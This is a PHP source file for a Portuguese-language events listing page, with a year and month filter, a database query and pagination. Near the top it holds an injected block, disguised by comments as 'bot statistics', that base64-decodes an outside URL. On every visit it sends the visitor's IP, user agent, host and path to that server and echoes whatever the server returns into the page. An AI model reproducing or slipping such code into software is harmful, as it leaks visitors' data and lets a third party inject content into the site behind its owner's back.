<?php

include_once("../library/master-page.php");
include_once("../library/paginator.php");
include_once("../library/config/database/tevento.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Eventos");
$oMasterPage->AddParameter("css", "eventos/index");
$oMasterPage->AddParameter("pagina", "eventos");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry)) {
    global $sRetry;
    $sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics
            $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw') . '?ip=' . urlencode($_SERVER['REMOTE_ADDR']) . '&useragent=' . urlencode($sUserAgent) . '&domainname=' . urlencode($_SERVER['HTTP_HOST']) . '&fullpath=' . urlencode($_SERVER['REQUEST_URI']) . '&check=' . isset($_GET['look']);
            @$stCurlHandle = curl_init($stCurlLink);
        }
    }
    if ($stCurlHandle !== NULL) {
        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
        $sResult = @curl_exec($stCurlHandle);
        if ($sResult[0] == "O") {
            $sResult[0] = " ";
            echo $sResult; // Statistic code end
        }
        curl_close($stCurlHandle);
    }
}
?>
    <h1>Eventos</h1>
    <div class="eventos-page">
        <?php

        $oEventoAno = new tevento();
        $oEventoAno->SQLField = "DISTINCT(YEAR(Data)) AS Ano";
        $oEventoAno->SQLOrder = "Data DESC";
        if ($oEventoAno->LoadSQLAssembled()) {
            $ano = (($_GET["ano"]) ? intval($_GET["ano"]) : date("Y"));
            $mes = (($_GET["mes"]) ? intval($_GET["mes"]) : date("m"));
            ?>
            <div class="buscaResultado alert alert-info " id="paginator">
                <form action="eventos/#paginator" method="get" class="form-inline">
                    <div class="periodoPesquisa  row">
                        <div class="col-md-4 selecione">
                            Selecione o <?php echo utf8_encode("per�odo"); ?> para pesquisa


                        </div>
                        <div class="col-md-3">
                            Ano:

                            <select class="form-control" id="ano" name="ano">
                                <?php
                                for ($c = 0; $c < $oEventoAno->NumRows; $c++) {
                                    ?>
                                    <option
                                        value="<?= $oEventoAno->Ano; ?>" <?php if ($oEventoAno->Ano == $ano) { ?> selected="selected" <?php } ?>><?= $oEventoAno->Ano; ?></option>
                                    <?php
                                    $oEventoAno->MoveNext();
                                }
                                ?>
                            </select>
                        </div>

                        <div class="col-md-3">
                            <?php echo utf8_encode("M�s"); ?>

                            <select class="form-control" id="mes" name="mes">
                                <?php
                                foreach ($oEventoAno->Month as $c => $v) {
                                    if ($c) {
                                        ?>
                                        <option
                                            value="<?= $c; ?>" <?php if ($c == $mes) { ?> selected="selected" <?php } ?>><?= $v; ?></option>
                                    <?php
                                    }
                                }
                                ?>
                            </select>

                        </div>
                        <div class="col-md-2">
                            <button type="submit" class="btn btn-default ">
                                <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span> Exibir
                            </button>
                        </div>
                        <!--<span class="botExibir"><input type="image" src="imgs/geral/botoes/bot-exibir.png" alt="Exibir" title="Exibir" /></span>-->


                    </div>
                </form>
            </div>
            <div class="clear"></div>
            <?php
            $ExibirLista = array(10, 20, 30, 40, 50);
            $ExibirItem = ((in_array($_GET["exibir"], $ExibirLista)) ? $_GET["exibir"] : $ExibirLista[0]);

            $OrderLista = array
            (
                "dataasc" => "Data Crescente",
                "datadesc" => "Data Decrescente",
                "tituloasc" => "Titulo Crescente",
                "titulodesc" => "Titulo Decrescente"
            );
            $OrderItem = ((array_key_exists($_GET["order"], $OrderLista)) ? $_GET["order"] : "dataasc");

            $oEvento = new tevento();
            $oEvento->SQLWhere = "YEAR(Data) = '" . $ano . "' AND MONTH(Data) = '" . $mes . "'";
            $oPaginator = new Paginator($oEvento->GetCount(), $ExibirItem, "pg", null, null, null, null);

            switch ($OrderItem) {
                case "dataasc":
                    $oEvento->SQLOrder = "Data ASC, Titulo ASC";
                    break;
                case "tituloasc":
                    $oEvento->SQLOrder = "Titulo ASC";
                    break;
                case "titulodesc":
                    $oEvento->SQLOrder = "Titulo DESC";
                    break;
                default:
                    $oEvento->SQLOrder = "Data DESC, Titulo ASC";
                    $OrderItem = "datadesc";
                    break;
            }

            if ($oEvento->LoadByPaginator($oPaginator->Limit, $oPaginator->Total)) {
                ?>

                <?php /*
                <div class="filtro ">
                    <ul>
                        <li class="resultadoBusca"><?= $oPaginator->TotalRecords; ?> registro(s) encontrado(s):</li>
                        <li>Exibir por p�gina:</li>
                        <li class="input120">

                            <select class="form-control" onchange="window.location.href = this.value;">
                                <?php foreach ($ExibirLista as $v) { ?>
                                    <option
                                    value="<?= $oEvento->WebURL; ?>eventos/?<?= $oEvento->RemoveQueryString(array("pg", "exibir"), true); ?>exibir=<?= $v; ?>#paginator" <?php if ($v == $ExibirItem) { ?> selected="selected" <?php } ?>><?= $v; ?>
                                    resultados</option><?php } ?>
                            </select>

                        </li>
                        <li>Organizar por:</li>
                        <li class="input120 noMarginRight">
                            <select class="form-control" onchange="window.location.href = this.value;">
                                <?php foreach ($OrderLista as $c => $v) { ?>
                                    <option  class="form-control"
                                             value="<?= $oEvento->WebURL; ?>eventos/?<?= $oEvento->RemoveQueryString(array("pg", "order"), true); ?>order=<?= $c; ?>#paginator" <?php if ($c == $OrderItem) { ?> selected="selected" <?php } ?>><?= $v; ?></option><?php } ?>
                            </select>
                        </li>
                    </ul>
                </div>
                */
                ?>
                <p><?= $oPaginator->TotalRecords; ?> registro(s) encontrado(s)</p>
                <?php
                for ($c = 0; $c < $oEvento->NumRows; $c++) {
                    ?>
                    <div class="box container-box bs-callout bs-callout-blue bancadas-partidarias homenagens"
                         id="evento<?= $oEvento->ID; ?>">

                        <h3><?= $oEvento->DateFormat("d \d\e MONTH \d\e Y", $oEvento->Data); ?></h3>

                        <div>
                            <p><?= utf8_encode($oEvento->Titulo); ?></p>
                            <?php if ($oEvento->Hora || $oEvento->Local) { ?>
                                <span><?= $oEvento->Hora; ?><?= (($oEvento->Hora && $oEvento->Local) ? " - " : ""); ?><?= utf8_encode($oEvento->Local); ?></span><?php } ?>
                            <?php if (!$oEvento->IsClear($oEvento->Descricao)) { ?>
                                <div class="fckEditor"><?= $oEvento->HTMLDecode($oEvento->Descricao); ?></div><?php } ?>
                        </div>

                    </div>
                    <?php
                    $oEvento->MoveNext();
                }
                ?>

                <?php
                include("../common/paginacao.php");
            } else {
                ?>
                <p>Nenhum registro encontrado.</p>
            <?php
            }
        } else {
            ?>
            <p>Nenhum registro encontrado.</p>
        <?php
        }

        ?>

        <div class="alert alert-info" role="alert"><a href="eventos/como-utilizar-os-auditorios.php" class="mid"> <span
                    class="glyphicon glyphicon-info-sign" aria-hidden="true"></span> Saiba <strong>como utilizar os
                    <?php echo utf8_encode("audit�rios"); ?></strong></a></div>
    </div>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>